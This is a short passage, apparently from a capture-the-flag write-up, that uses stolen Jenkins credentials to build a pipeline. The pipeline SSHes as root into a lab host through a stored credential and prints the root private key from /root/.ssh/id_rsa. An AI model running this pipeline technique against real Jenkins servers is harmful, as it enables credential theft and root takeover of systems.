these creds are used to login to the jenkins instance

we create a pipeline and build
pipeline {
  agent any
  stages {
    stage('SSH') {
      steps {
        script {
          sshagent(credentials: ['1']) {
            sh '''ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null root@10.129.230.220 "cat /root/.ssh/id_rsa"'''
          }
        }
      }
    }
  }
}
